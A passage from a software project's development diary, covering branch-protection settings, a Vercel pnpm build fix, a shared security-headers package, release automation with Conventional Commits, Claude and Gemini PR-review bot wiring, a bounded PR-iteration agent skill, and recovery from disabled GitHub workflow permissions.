The Phase 0b branch protection (per the original ADR-025 ruleset) required `required_approving_review_count = 1` plus `require_code_owner_reviews = true`. With only one developer (`@agranado2k`) and CODEOWNERS pointing at the same single account, this was an unmergeable configuration — GitHub refuses to let you approve your own PR, so every merge would have been blocked. The Phase 0b PR squeaked through only because the protection rule wasn't applied to that repo state yet.

Decision: drop human approval to `0` and turn `require_code_owner_reviews` off. The PR mechanism stays (no direct pushes to main; signed commits + linear history + conversation resolution still required), and CI status checks + AI review (Claude + Gemini per ADR-030) remain the gates. CODEOWNERS becomes informational — useful to GitHub's UI as an ownership map but not a merge gate.

This is a deliberate revision of **ADR-025**. When a second developer joins, flip `required_approving_review_count` back to `1` and `require_code_owner_reviews` back to `true` in `infra/terraform/modules/github-repo/main.tf` — both are a single line each. Spec rev 7 still describes the multi-developer ruleset; the diary is the authoritative log for this decision until the spec sync (deferred along with the ADR-031 sync to a later Phase 0c/0d follow-up).

**Code changes landed in this commit:**

- `modules/github-repo/main.tf` — `required_approving_review_count = 0`, `require_code_owner_reviews = false`, comment block explaining the revert path
- `CLAUDE.md` — rewrote the "PRs receive automated review…" line to reflect ADR-032; rewrote the runtime-deps paragraph to drop the CODEOWNERS-review wording
- `README.md` — updated the "PR-only delivery" bullet for solo-mode

`enforce_admins`, `require_signed_commits`, `required_linear_history`, `allows_force_pushes = false`, `allows_deletions = false`, `required_conversation_resolution` — all unchanged. The owner still cannot bypass the PR mechanism.

**Vercel build saga (in-flight on this PR).**

The first three commits past the initial scaffold all hit Vercel build failures and cost real debugging time. Worth recording because the wrong fix is more likely than the right one on a Node-version/package-manager incompatibility:

1. `engines.pnpm: ">=9"` triggered `ERR_PNPM_UNSUPPORTED_ENGINE` because Vercel's image runs pnpm 6.35.1, which reads `engines.pnpm` and bails before install. Removed the field; added per-app `vercel.json` with `installCommand` running `corepack enable && corepack prepare pnpm@<version> --activate && pnpm install`.
2. With Corepack-installed pnpm 9.12.0 + Node 24 (Vercel's default), every npm registry fetch died with `ERR_INVALID_THIS: Value of "this" must be of type URLSearchParams`. I assumed this was the known pnpm/Node 22.12+ undici bug. Bumped to pnpm 9.15.4 — no fix.
3. Bumped to pnpm 10.5.0 — no fix.
4. **Actual root cause** (per [Jelani Harris's blog](https://jelaniharris.com/blog/fixing-errinvalidthis-error-on-vercel-using-pnpm/) + the Vercel community thread): Vercel's Corepack support is gated by the env var `ENABLE_EXPERIMENTAL_COREPACK=1` at the *project* level. Without it, the install command runs Corepack but Vercel's wrapper bypasses the prepared pnpm binary and falls back to a built-in that hits the Node 24 URL bug. Set via `vercel env add` on `arp-app-prod` + `arp-view-prod` (Production + this branch's Preview). Empty commit triggered a fresh deploy; both projects went green.

**Carry-over for Phase 0c.5** (Terraform re-tighten + codification pass): add `ENABLE_EXPERIMENTAL_COREPACK = "1"` to `modules/vercel-app/main.tf` as a `vercel_project_environment_variable` resource so future preview branches don't need manual CLI setup. Right now the env var is scoped to the `feat/phase-0c-skeleton-apps` branch only.

**Memory pointer (future-me)**: the wrong fix on a "build is broken on Vercel" symptom is to chase package manager versions. The right fix is usually a Vercel-project-level setting (env var, Node version, Root Directory). Read the actual Vercel docs and community thread before bumping versions speculatively.

### 2026-06-02 — Phase 0c.2: shared `arp-headers` package + Edge Middleware stubs

Phase 0c.1 merged at `2fa0d22`; both Phase 0b and 0c.1 worktrees cleaned up. Phase 0c.2 starts in `worktree/phase-0c-shared-headers/` on `feat/phase-0c-shared-headers`.

The goal of this slice: stand up the **single source of truth for security headers** (`packages/headers/`) so every route in both apps reaches it through the same function, and land the Edge Middleware skeletons so Phase 0d's infra tests have something concrete to assert against.

**`packages/headers/` — exposes two functions:**

| Function | Origin | Distinguishing pieces |
|---|---|---|
| `viewHeaders()` | `view.<domain>` | Full ADR-013 stack — two CSP headers (enforcing + `sandbox`), report-only shadow policy, COOP=`same-origin`, CORP=`same-site`, `Origin-Agent-Cluster`, `Referrer-Policy: no-referrer`, `Cache-Control: private, max-age=60, must-revalidate`. |
| `appHeaders()` | `app.<domain>` | Same baseline tightened where we control the content — no `'unsafe-inline'` in `script-src`, CORP=`same-origin` (tighter), `Referrer-Policy: strict-origin-when-cross-origin`, **Trusted Types** enforced (`Require-Trusted-Types-For: 'script'` + `Trusted-Types` allowlist), no default Cache-Control (loaders set their own). |

Both functions return a fresh `Headers` instance so callers can override per-response (e.g. `/health` overrides Cache-Control to `no-store`). Shared utilities (`PERMISSIONS_POLICY` denying ~13 sensors/APIs, `HSTS` with preload, `Report-To` builder) live in `src/permissions-policy.ts`. The `Report-To` endpoint resolves to `${APP_ORIGIN}/csp-report` at request time so prod / preview / local each get the right URL.

Package is `name: "arp-headers"` (unscoped, matches `arp-app` / `arp-view`), `private: true`, `type: "module"`, exports `./` `./view` `./app` directly from `src/*.ts` (no build step — both apps are Vite, which handles TS workspace deps natively).

**Edge Middleware stubs:**

- `apps/view/middleware.ts` — **ADR-014 lands here**: any GET carrying `Service-Worker: script` returns 403 with `x-edge-marker: view-mw-sw-blocked`. Other requests pass through `next()` with `x-edge-marker: view-mw` so Phase 0d's `edge-middleware.feature` test can assert the edge ran. Per-IP rate-limit + `scan_status` precheck are tagged `TODO Phase 1`.
- `apps/app/middleware.ts` — placeholder `next()` with `x-edge-marker: app-mw`. Signup/login rate-limit + Turnstile + CSRF tagged `TODO Phase 1`.

Both use `@vercel/edge`'s `next()` helper (added to each app's dependencies along with `arp-headers: workspace:*`).

**`/health` routes rewired:**

Both apps' `health.tsx` switched from `Response.json` to `new Response(JSON.stringify(...), { headers })` where `headers` comes from the shared package. They override `content-type` + `cache-control: no-store` on top of the baseline stack so the `/health` JSON is always fresh but every other ADR-013 header still ships. This is the canonical pattern future routes will follow.

**What's deliberately NOT in this commit:**

- No CSP nonces yet — `'unsafe-inline'` in viewer `script-src` is permitted (ADR-013) because users author the scripts. We add nonces to the dashboard when there's actual inline script to nonce in Phase 1+.
- No `/csp-report` endpoint — that's an `app.<domain>` route, lands in Phase 1 alongside the report ingestion table.
- No Upstash wiring in the middlewares — Phase 1's rate-limit slice.
- No unit tests yet — TDD scaffolding (`.claude/skills/tdd/SKILL.md` + hooks) is Phase 0e per ADR-022.

**Open question for review**: the dashboard's CSP `connect-src` currently allowlists `https://*.clerk.accounts.dev` and `https://clerk.accounts.dev` (Clerk's default token endpoint). Once the prod Clerk instance has its own subdomain on `clerk.<our-domain>`, we narrow this. Tracked for Phase 0c.5 alongside Terraform-codified branch protection.

### 2026-06-02 — Conventional Commits + semantic-release + rebase-merge convention

Two things needed for a clean release pipeline that's auditable across the team and across time:

1. **Commit-message format the team can parse** — humans and tools both. The Conventional Commits standard (`<type>(<scope>): <subject>`) is the de-facto choice, has tooling everywhere, and maps cleanly onto SemVer (`feat` → minor, `fix`/`perf` → patch, `BREAKING CHANGE:` → major).
2. **An automatic version + tag + release pipeline** so we never debate "what's in prod right now" — the answer is `v1.4.2` and the GitHub Release has the bullet list of what changed.

**Decision**: Adopt Conventional Commits across all commits and PR titles; use the `semantic-release` npm package on merge-to-`main` to compute the next version, write the git tag, and publish a GitHub Release with auto-generated notes. No npm publish (this isn't a distributed library); no in-repo `CHANGELOG.md` (GitHub Releases is the source of truth — see "branch-protection interaction" below).

**Why semantic-release and not Changesets** (the obvious alternative): we evaluated. Changesets is the better fit for libraries published to npm where per-package versioning matters. Our shape is a SaaS — single application, multiple internal packages — and the team's stated preference is commit-driven (one less file to remember when opening a PR). Diary entry stands as the comparison record so this isn't relitigated.

**Why no in-repo `CHANGELOG.md` + `@semantic-release/git` plugin**: those would push back to `main`, which under ADR-025 + ADR-032 still requires signed commits + linear history + no force-push. The GitHub Actions bot can't sign commits without extra secret machinery, and we're not adding that just to keep a markdown file. GitHub Releases gives the same audit trail without the push-to-protected-branch dance.

**Allowed commit types** (`@commitlint/config-conventional` defaults, mirrored in `commitlint.config.js`): `feat`, `fix`, `docs`, `style`, `refactor`, `perf`, `test`, `build`, `ci`, `chore`, `revert`. Bump mapping in `.releaserc.json`:

| Type | Bump | Shows in release notes? |
|---|---|---|
| `feat` | minor | ✅ "Features" |
| `fix` | patch | ✅ "Bug Fixes" |
| `perf` | patch | ✅ "Performance" |
| `refactor` | none | ✅ "Refactoring" |
| `docs` | none | ✅ "Documentation" |
| `chore` / `test` / `ci` / `build` / `style` | none | hidden by default |
| `BREAKING CHANGE:` in body or `!` after type | major | ✅ "BREAKING CHANGES" |

**Enforcement (two layers)**:

1. **Local — `.husky/commit-msg`** runs `commitlint` on every commit. Bad message → rejected. Bypass with `--no-verify` exists for emergencies but is logged.
2. **CI — `.github/workflows/pr-title.yml`** lints the PR title via `amannn/action-semantic-pull-request@v5`. Because branch protection only allows squash-merge, the PR title becomes the commit on `main` — the title is what `semantic-release` actually parses. Linting it stops a Conventional-Commits-violating merge from breaking the release pipeline.

**Release workflow — `.github/workflows/release.yml`**: triggers on push to `main`, full git history checkout, Corepack-prepares pnpm 10.5.0, runs `pnpm exec semantic-release`. The Vercel-style `ENABLE_EXPERIMENTAL_COREPACK` dance isn't needed here — this is GitHub-hosted, not Vercel-hosted. `permissions.contents: write` lets the workflow create tags + releases without a PAT.

**Files landed in this commit:**

- `package.json` — added `prepare`, `commitlint`, `release`, `release:dry` scripts; 8 new devDependencies (commitlint, husky, semantic-release + 3 plugins, conventionalcommits preset)
- `commitlint.config.js` — extends `@commitlint/config-conventional`, relaxes `body-max-line-length` (we paste log excerpts in commit bodies regularly)
- `.husky/commit-msg` — runs `pnpm exec commitlint --edit "$1"`, executable bit set
- `.releaserc.json` — branches `main`, `tagFormat: v${version}`, the three-plugin pipeline (commit-analyzer → release-notes-generator → github) with the bump table above
- `.github/workflows/release.yml` — push-to-main trigger, concurrency-guarded, semantic-release run
- `.github/workflows/pr-title.yml` — lints PR titles with the same type allowlist
- `CLAUDE.md` — added rule #4 under "Before any change" with the commit-format rule + examples

**Carry-over to 0c.5**: `release.yml` and `commitlint.yml` should be added to `required_status_checks` in the `github_branch_protection` module so a Conventional-Commits-failing PR can't merge.

**Memory pointer**: zora-pantheon was the reference point for "find a release setup we've used before." Turned out it uses Changesets, not semantic-release; we adopted semantic-release anyway after weighing both. Don't conflate the two next time future-me hears "like the zora-pantheon setup."

#### ADR-033 revision (same day) — rebase-merge only, every commit preserved

Initial 0c.x convention was squash-merge: branch protection's `allow_squash_merge = true` + `allow_rebase_merge = false`, with the PR title becoming the single squash commit on `main`. A `pr-title.yml` workflow linted that title.

User pushed back: squash-merge throws away every commit on the PR and collapses useful history (the debug-and-fix sequence for the Vercel Corepack hunt is a vivid example — four commits chasing the wrong fix before landing the right one; squash erases the trail). It also feeds `semantic-release` only one commit per PR, so a single PR can only contribute one release-notes bullet even if it did multiple `feat:` + `fix:` things.

Revised decision: **rebase-merge only**. Every PR commit is replayed onto `main` in order, preserving full history while staying linear (branch protection's `required_linear_history = true` is happy — rebase produces a linear sequence). `semantic-release` on the next run sees every typed commit and aggregates them properly into the release notes.

**Implications + the workflow churn:**

- The PR title is no longer the merge commit, so `pr-title.yml` is obsolete. Deleted.
- **Every individual commit** now matters. The local `.husky/commit-msg` hook stays. Added `.github/workflows/commitlint.yml` that lints every commit in the PR range (`pnpm exec commitlint --from $BASE_SHA --to $HEAD_SHA --verbose`) as belt-and-braces against commits made with `--no-verify` or pushed from outside this checkout.
- **PR authors must curate before opening**: if a PR has a "fix typo" or "address review feedback" commit, squash it locally with `git rebase -i` first. The on-main history is the historical record; nobody wants a typo-fix line in v1.4.2's release notes. CLAUDE.md rule #4 updated accordingly.

**Terraform diff:**

- `modules/github-repo/main.tf` — `allow_squash_merge = true → false`; `allow_rebase_merge = false → true`. Comment block explaining the rationale + the trade-off.

The decision lives under ADR-033 rather than a new ADR because it's the same problem (how does a commit reach `main` and what does it look like there) — the squash/rebase choice is internal to that decision, not an architectural pivot on its own.

**Carry-over to 0c.5 (updated)**: register `Release` + `Commit messages (Conventional Commits)` as required status checks. `pr-title.yml` removed from the list since it no longer exists.

### 2026-06-02 — Claude bot wiring (partial ADR-030 — Phase 0c.4a)

User ran `/install-github-app` from Claude Code, which opens PR #5 with two workflows from the official `anthropics/claude-code-action@v1`. Rather than merge PR #5 separately, we folded its files into PR #4 with project-specific customization baked in:

| File | What it does | Trigger |
|---|---|---|
| `.github/workflows/claude.yml` | `@claude` mention bot — responds in issue / PR / review-comment / review threads | `issue_comment`, `pull_request_review_comment`, `pull_request_review`, `issues` (open/assign) — guarded by a job-level `if` that matches `@claude` in the relevant body |
| `.github/workflows/claude-code-review.yml` | Auto-reviewer on every PR — uses the `code-review@claude-code-plugins` skill from Anthropic's plugin marketplace, posts inline review comments on the diff | `pull_request` opened / synchronize / ready_for_review / reopened |

Customizations vs PR #5's defaults (all derived from the Claude Code Action [usage docs](https://github.com/anthropics/claude-code-action/blob/main/docs/usage.md)):

- **`use_commit_signing: true`** on `claude.yml` — our branch protection requires signed commits (ADR-025). The action signs via the GitHub API when this flag is on; no SSH key secret needed.
- **`contents: write` + `pull-requests: write`** on `claude.yml` — the bot needs to commit fixes back and reply on review threads. PR #5 had only read permissions.
- **`--max-turns 20`** on `claude.yml`, **`--max-turns 25`** on `claude-code-review.yml` — cost control.
- **Project-policy `--system-prompt`** on `claude.yml` — tells Claude: every commit must be Conventional Commits (ADR-033), merges are rebase-only, ADR-024 forbids fp-ts / Effect / Remeda, never bypass the husky hook with `--no-verify`. Without this preamble, Claude would happily write non-conforming commits that fail the `commitlint` check and block the PR.
- **Per-ADR prompt augmentation** on `claude-code-review.yml` — the plugin's default prompt is generic; we append project-specific flags (call out violations of ADR-013 / ADR-014 / ADR-024 / ADR-033 specifically). The reviewer learns our policies without manual context-paste.

**Auth**: both workflows use `secrets.CLAUDE_CODE_OAUTH_TOKEN`, which the GitHub App install flow populated. Already in the repo's Actions secrets — no manual setup.

**Scope vs ADR-030**: this is the Claude half. Gemini half (`gemini-review.yml`) is still pending for Phase 0c.4b — either as a separate official action or a custom workflow calling the Gemini API. Either way it's additive — review bots aren't gating (advisory only, per ADR-032).

**Folding PR #5 into PR #4**: PR #5 will be closed after this PR merges. The bot workflows belong with the rest of the ADR-033 + ADR-030-related plumbing (commit-format enforcement + release pipeline + bot review wiring) so it all ships and applies together.

**Carry-over to 0c.5**: do NOT add the Claude Code Review check to `required_status_checks` — bot reviews are advisory per ADR-032. The `Release` workflow and the `commitlint` workflow are the only release-pipeline checks worth gating on.

### 2026-06-02 — Gemini bot wiring (closes ADR-030 — Phase 0c.4b)

Adds the Gemini half of the dual AI review. With this, ADR-030's "Claude + Gemini auto-review on every PR" is fully wired — both bots run on every PR open / sync / ready / reopen, both post inline review comments, and neither gates the merge (advisory per ADR-032).

**`.github/workflows/gemini-review.yml`** uses the official `google-github-actions/run-gemini-cli@v0` action with the `code-review` extension from `gemini-cli-extensions`. Adapted from the [upstream `pr-review` example](https://github.com/google-github-actions/run-gemini-cli/blob/main/examples/workflows/pr-review/gemini-review.yml), with the following deliberate simplifications:

1. **Self-contained, not a `workflow_call`** — upstream is a reusable workflow that needs a separate dispatcher. We trigger directly on `pull_request` events to avoid the dispatcher layer for a solo-dev setup.
2. **API-key auth, not Workload Identity Federation** — WIF is Google's recommended production path but needs a GCP project to federate against. Our `GEMINI_API_KEY` repo secret (already populated by Phase 0b's Terraform via `actions_secrets`) is sufficient for now. When a GCP project lands, swap the auth inputs — the action supports both modes simultaneously.
3. **Project-policy prompt** — same pattern as `claude-code-review.yml`: the upstream's `/pr-code-review` slash command runs as-is, but we append flags directing Gemini to specifically call out violations of ADR-013 (security headers), ADR-014 (service workers blocked at edge), ADR-024 (no fp-ts/Effect/Remeda; readonly domain), ADR-033 (Conventional Commits + rebase-merge), and ADR-025/032 (solo-dev branch protection — so it doesn't flag the 0-approval setup as a finding).
4. **GitHub MCP server** scoped to the three tools the reviewer actually needs (`add_comment_to_pending_review`, `pull_request_read`, `pull_request_review_write`) rather than the upstream's broader set. Smaller blast radius if the action is ever compromised.

**A note on the consumer Gemini Code Assist GitHub App**: per Google's docs, the consumer-tier "Gemini Code Assist on GitHub" app is scheduled to shut down **2026-07-17**. We deliberately did NOT install that app — `run-gemini-cli` is the supported path forward. If we ever onboarded the App for one-click setup, we'd need to migrate before that shutdown anyway. Skipped the round-trip.

**No mention bot for Gemini** (yet): the upstream provides a `gemini-invoke` workflow that responds to `@gemini-cli` mentions, mirroring our `claude.yml`. Skipped because:
- The Claude mention bot is enough for "let an LLM help me on a PR" use cases.
- The Gemini auto-reviewer is where ADR-030's value lives (second opinion on every PR).
- Adding it later is a single file — no architectural lock-in.

**Open question**: Gemini's review prompt currently asks it to read `CLAUDE.md` and `docs/diary.md`. CLAUDE.md is the Claude-aimed name, but the *content* is project policy applicable to any reviewer. Renaming to `AGENTS.md` or `CONTRIBUTING.md` would be more inclusive — flagged but not urgent. Tracking for the next housekeeping pass.

**Carry-over to 0c.5**: same as the Claude review — do NOT add `Gemini Code Review` to `required_status_checks`. Advisory only.

### 2026-06-02 — `/pr-iterate` skill: closed-loop PR drive-to-green (Phase 0c.4c)

The dual AI review (ADR-030) is now wired, but the operator still has to manually read the bot comments + failing checks and decide what to do. That's the gap this slice closes — gives Claude Code (the local IDE/CLI tool) a procedure to drive an open PR to green on its own, advisory comments and all.

**File**: `.claude/skills/pr-iterate/SKILL.md`

**Invocation**:

| Mode | Command | When to use |
|---|---|---|
| Single iteration | `/pr-iterate <PR#>` | After a manual push, to clean up any new bot feedback before walking away |
| Continuous loop | `/loop /pr-iterate <PR#>` | "Set it and forget it" — the loop runner re-fires the skill every wake-up until the stop condition is reached |

Each iteration runs the same five-step procedure: snapshot via `gh` → triage against project ADRs → apply / reply / escalate → commit + push as Conventional Commits → report status. The skill **never merges**, **never `--force-push`s**, and **never `--no-verify`s** the husky hook. It escalates when a bot suggestion contradicts an ADR or when it genuinely can't diagnose a failing check from the logs.

**Why a skill rather than a hook**:

- Hooks fire on events Claude Code knows about (`Stop`, `UserPromptSubmit`, etc.). A `Stop` hook that auto-fires `/pr-iterate` on session end was tempting, but the noise is high — every session would trigger a poll, even sessions that didn't touch a PR.
- A skill is **opt-in by invocation**, which is the right blast radius. Operator decides when to start the loop; operator decides when to stop (`Ctrl-C` the loop or close the session).
- A skill **composes with `/loop`** for free, which gives the auto-iteration behavior without writing custom scheduling logic.

**Triage policy** (codified in the skill):

| Suggestion class | Skill action |
|---|---|
| Improves security / correctness / readability, no ADR conflict | Apply, commit, optionally reply on thread |
| Contradicts an ADR (e.g. "use fp-ts" violates ADR-024, "squash to one commit" violates ADR-033) | Reply on thread with the ADR number cited; don't apply |
| Ambiguous — touches an open question or needs a design call | Escalate to operator with a one-line summary; stop the iteration |
| Test failure I can't diagnose from logs | Escalate (don't guess at fixes) |

**What it deliberately doesn't do**:

- **No PR merging** — that's GitHub's gate, not Claude's.
- **No branch-protection modification** — even via Terraform from inside the iteration. ADR-032 changes go through their own PR.
- **No sleep-polling inside one iteration** when invoked via `/loop` — the loop runner schedules the next wake; the iteration just runs once and returns.
- **No Stop-hook auto-trigger** for v1 — opt-in invocation is the right blast radius. Revisit if the manual cadence is genuinely annoying.

**Cross-references the skill cites by ADR number in replies** (so future-greps work):
- ADR-013 (security headers) · ADR-014 (SW block) · ADR-024 (no fp-ts) · ADR-025 (PR + signed commits + linear) · ADR-030 (dual AI review) · ADR-032 (0 approvals) · ADR-033 (Conventional Commits + rebase-merge)

**Carry-over to a future polish pass**: when the skill encounters its first real "I can't apply this — needs a human" case, capture the pattern in the diary so the triage table grows over time. The current table covers the obvious cases; edge cases will emerge from use.

### 2026-06-03 — Broken release pipeline + recovery: `default_workflow_permissions` was silently set to `read`

After PR #4 squash-merged, no workflows fired on `main`. No `Release` run → no `v1.0.0` tag, no GitHub Release. No `Terraform` apply → no `allow_squash_merge = false` (rebase-merge still not enabled), no `ENABLE_EXPERIMENTAL_COREPACK = "1"` codified at the Vercel project level (only the manual per-branch CLI sets are live).

**Symptom audit** (all confirmed via `gh api` / `gh run list`):

| Merge | SHA | Push workflows that fired | Should have fired |
|---|---|---|---|
| Phase 0b (PR #1) | `51b6186` | `Terraform` ✓ | `Terraform` (apply-shared / apply-prod) |
| Phase 0c.1 (PR #2) | `2fa0d22` | `Terraform` ✓ | `Terraform` (no infra changes → empty plan, harmless) |
| Phase 0c.2 (PR #3) | `c04de5c` | **nothing** ✗ | (no infra changes, no workflows added → expected nothing) |
| Phase 0c.4 (PR #4) | `e483671` | **nothing** ✗ | `Terraform` (apply-shared flips merge mode + adds Corepack env var) + `Release` (`v1.0.0` from the `feat:` commit) |

The cutoff is between PR #2 and PR #4. What changed in between: the user ran `/install-github-app` to install the official Claude Code GitHub App (which opened PR #5 with the Claude workflows).

**Root cause** — the GitHub App install silently set the repository's `default_workflow_permissions` to `read`:

```
$ gh api repos/agranado2k/ai-report-platform/actions/permissions/workflow
{"default_workflow_permissions":"read","can_approve_pull_request_reviews":false}
```

This is the maximum `GITHUB_TOKEN` permission a workflow can be granted, and it silently caps workflows that declare `permissions.contents: write` (as both `release.yml` via `@semantic-release/github` and `terraform.yml` via the apply step do). In this repo's case the effect was stronger than docs suggest: not just capped, but the workflows never fired on `push` events at all. Could be a quirk of the GitHub App installation flow, or undocumented interaction with branch protection's `required_signatures`. Either way, the symptom is reproducible: PRs #3 and #4 both squash-merged into `main` and produced ZERO `push`-event workflow runs.

**Fix** — restore `write` as the default:

```
$ gh api -X PUT repos/agranado2k/ai-report-platform/actions/permissions/workflow \
    -f default_workflow_permissions='write' -F can_approve_pull_request_reviews=false
```

Verified after the call:

```
{"default_workflow_permissions":"write","can_approve_pull_request_reviews":false}
```

**Hardening landed in this PR** (`fix/release-pipeline-dispatch`):

1. Added `workflow_dispatch:` to `release.yml` and `terraform.yml` — recovery hatch so we can re-run them manually via `gh workflow run` if push triggers ever stop firing again. Cost: nil.
2. Diary entry (this one) documents the symptom, the root cause, and the recovery steps so future-me doesn't relearn this from scratch.

**Recovery steps after this PR merges** (operator runs from main):

```bash
# Run release.yml manually to compute v1.0.0 from the missed merges
gh workflow run release.yml --ref main

# Run terraform apply manually to flip squash → rebase and add the
# ENABLE_EXPERIMENTAL_COREPACK env var that PR #4 codified
gh workflow run terraform.yml --ref main
```

Both should complete in <2 minutes. After that:

- A `v1.0.0` git tag + GitHub Release exist
- `allow_squash_merge = false`, `allow_rebase_merge = true` on the repo — next PR is rebase-merged
- `ENABLE_EXPERIMENTAL_COREPACK` is codified per-project; future preview branches inherit it (no more manual `vercel env add` per branch)

**Carry-over** — if the GitHub App install ever re-sets `default_workflow_permissions` to `read` (e.g. on re-install), the symptom returns. Worth periodically auditing via `gh api ... /actions/permissions/workflow`. A Terraform resource (`github_actions_repository_permissions` or similar) to manage this declaratively would lock it down — flagged for 0c.5 alongside the Terraform-codified branch protection re-tighten.

**Memory pointer** — when a GitHub App installation flow appears to "just work" but downstream workflows mysteriously stop firing, **check `gh api repos/{owner}/{repo}/actions/permissions/workflow` first**. The default-permissions field is the silent breaker.

### 2026-06-03 — PR #6 merged + recovery sequence: half complete, second fix-up landing

After PR #6 merged at `f610f56`, push events on `main` started firing again (the `default_workflow_permissions: write` fix worked). The first push run produced:

- ✅ `Release` workflow → **`v1.0.0` tagged + GitHub Release published** (semantic-release computed major from the first-ever `feat:` commits)
- ✅ `Terraform / apply-shared` → **branch protection flipped**: `allow_squash_merge: false`, `allow_rebase_merge: true`. The next PR after this one is the project's first rebase-merge.
- ❌ `Terraform / apply-prod` → failed with `ENV_CONFLICT` on `ENABLE_EXPERIMENTAL_COREPACK`. The Production-target CLI entries we set manually for PRs #2 / #3 / #4 / #6 were still live and blocked Terraform's create.

**Recovery sweep**:

- Deleted both Production-target manual entries via `vercel env rm ENABLE_EXPERIMENTAL_COREPACK production --yes` on `arp-app-prod` + `arp-view-prod`. The four per-branch Preview entries remain (CLI rm syntax errored — but they don't conflict with Terraform's per-target=preview-with-no-branch entry; they're harmless orphans).
- Tried `gh workflow run terraform.yml --ref main` to retry `apply-prod`. Every job **skipped** because the apply jobs gate on `github.event_name == 'push'`. The `workflow_dispatch` trigger we added in PR #6 was correct at the workflow level but the job-level conditions never accepted it.

**Fix landing in this PR** (`fix/apply-jobs-dispatch`):

- `terraform.yml` `apply-shared` and `apply-prod` `if` conditions widened from `github.event_name == 'push' && github.ref == 'refs/heads/main'` to `(... push + main ...) || github.event_name == 'workflow_dispatch'`.
- `plan-shared` / `plan-prod` / `fmt-and-validate` stay PR-only — they don't need workflow_dispatch (no recovery use case).

**After this PR merges** (rebase-merge — first one in the project):

1. `terraform.yml` fires on push → `apply-shared` re-runs (idempotent — already in sync) and `apply-prod` re-runs (now succeeds — Production conflict gone; the all-preview Terraform entry won't collide with per-branch CLI entries).
2. `Release` workflow fires on the same push and computes `v1.0.1` (just `fix:` commits → patch bump).
3. The `ENABLE_EXPERIMENTAL_COREPACK` env var is finally codified on both Vercel projects for `production` + `preview` + `development` targets. Future preview branches get it automatically.

**Why the per-branch Preview entries are deliberately left orphaned**: deleting them via CLI errored with "Custom Environment not found" (Vercel's `vercel env rm <name> preview <branch>` has a quirky syntax that doesn't match its `add` form). They're cosmetic at this point — the all-preview Terraform entry will satisfy build needs for every branch. A housekeeping pass can sweep them when convenient; no urgency.

**Carry-over for 0c.5** (now bigger): codify `default_workflow_permissions` + `actions/permissions` settings in the `github-repo` Terraform module so the App-install drift can't recur silently. Plus the carry-over from the prior entry still stands: add `Release` + `Commit messages (Conventional Commits)` + the Terraform `Apply` jobs to `required_status_checks`.

### 2026-06-03 — Attempted GitHub Merge Queue setup; rejected by API (user-owned repo limitation)

PR #7 surfaced a documented GitHub limitation: with `require_signed_commits = true` AND rebase-merge as the only allowed merge method, the GitHub UI's **Rebase and merge** button rewrites each commit's committer date during the server-side rebase, which invalidates the existing signatures. GitHub cannot re-sign on the operator's behalf (only they hold the private key), so branch protection rejects the resulting unsigned commits and the PR never merges. Quote from the GitHub UI:

> Base branch requires signed commits. Rebase merges cannot be automatically signed by GitHub.

The PR commits themselves WERE verified — `gh api repos/.../commits/{sha} --jq .commit.verification` showed `{"verified": true, "reason": "valid"}` on both `a2bc910` and `ad85e09`. The verification was lost when GitHub rewrote the committer during rebase.

**Three resolutions evaluated**:

| Path | Trade-off |
|---|---|
| A. Drop `require_signed_commits` | Single Terraform change. Loses tamper-evidence on `main`. Closest to ADR-033's intent (preserve every PR commit). |
| C-1. Custom bot-signed rebase workflow | ~150 lines of YAML + a bot SSH/GPG key in secrets. Preserves both ADRs; all on us to maintain. |
| **C-2. GitHub Merge Queue (chosen)** | Built-in GitHub feature, free for public repos. Queue rebases + runs CI on rebased state + GitHub web-flow signs the result. Preserves ADR-025 (signed commits) AND ADR-033 revision (rebase-merge with every PR commit on main). One-line trigger addition per workflow that needs to gate merge. |

**Decision (ADR-034)**: Adopt GitHub Merge Queue as the merge mechanism for `main`. Both ADR-025 (`require_signed_commits = true`) and ADR-033 revision (rebase, every commit lands verbatim) stay in force unchanged — the queue does the rebase server-side and signs the result with the web-flow key, which `require_signed_commits` accepts.

**How merge queue works for us**:

- Operator clicks **"Merge when ready"** on a green PR → PR enters the queue
- Queue creates a synthetic ref `gh-readonly-queue/main/pr-N-XXX` containing the PR's commits rebased onto current `main`
- Workflows triggered on `merge_group` event run against this synthetic ref (this PR adds `merge_group:` to `commitlint.yml` and `terraform.yml`)
- On green: GitHub web-flow-signs the rebased commits and pushes them to `main`. Branch protection accepts the signed commits, the PR auto-closes.
- On red: PR is removed from the queue and the operator is notified.

The queue is `grouping_strategy = "ALLGREEN"` (require all required checks to pass) and `merge_method = "REBASE"` — straight-through, no batching surprises while we're solo-dev. We can tighten to batched grouping when the PR volume justifies it.

**Implementation**:

- `infra/terraform/modules/github-repo/main.tf` — added `github_repository_ruleset.merge_queue` alongside the existing `github_branch_protection.main`. Rulesets are the newer GitHub API; the old branch-protection resource doesn't expose merge queue settings. The two coexist: branch protection still enforces signed-commits / linear-history / no-force-push / no-delete / PR-only; the ruleset adds the merge queue behavior on top.
- `.github/workflows/commitlint.yml` — added `merge_group:` trigger; the lint step now reads `BASE_SHA` / `HEAD_SHA` from either `pull_request` or `merge_group` event payloads via the `||` fallback.
- `.github/workflows/terraform.yml` — added `merge_group:` trigger; `plan-shared` / `plan-prod` / `fmt-and-validate` conditions widened from `pull_request` only to `pull_request OR merge_group`; concurrency groups switched from `pull_request.number` to `pull_request.number || run_id` so queue runs don't collide with PR runs.
- `CLAUDE.md` rule 4 — updated to describe the merge-queue workflow (click "Merge when ready", queue rebases, web-flow-signs, pushes).

**Bot review workflows deliberately NOT triggered on `merge_group`**: `claude-code-review.yml` + `gemini-review.yml` already ran when the PR was opened — re-running them on the rebased state would burn API tokens for no judgment that wasn't already made. The bot reviews are advisory per ADR-032; they don't need to gate the queue.

**Bootstrap note for THIS PR**: same as PR #7 — until this PR merges, we still don't have merge queue available. The previous merge (PR #7) used the temporary squash-merge enablement via API; this PR (PR #8) needs the same temporary enablement to land. Once merge queue is live, no future bootstrap needed: every PR goes through the queue, the queue signs everything web-flow.

**Carry-over to 0c.5 (updated)**: when populating `required_status_checks` with real check names, include the merge_group-triggered ones (`commitlint` job, `terraform plan` jobs). The queue uses this list to decide green-ness; an empty list means it merges immediately with no gating.

### 2026-06-03 — ADR-035 landed: bot-merge workflow (PR #9)

Architectural decision is recorded at **`docs/adr/0035-bot-merge-workflow.md`** (the contract). This entry is the development chronology only.

**Sequence of the day**:

1. Squash-merged PR #8 expecting Merge Queue to come online via the `github_repository_ruleset.merge_queue` resource. Terraform `apply-shared` failed with a generic `Invalid rule 'merge_queue'` 422 from the GitHub API.
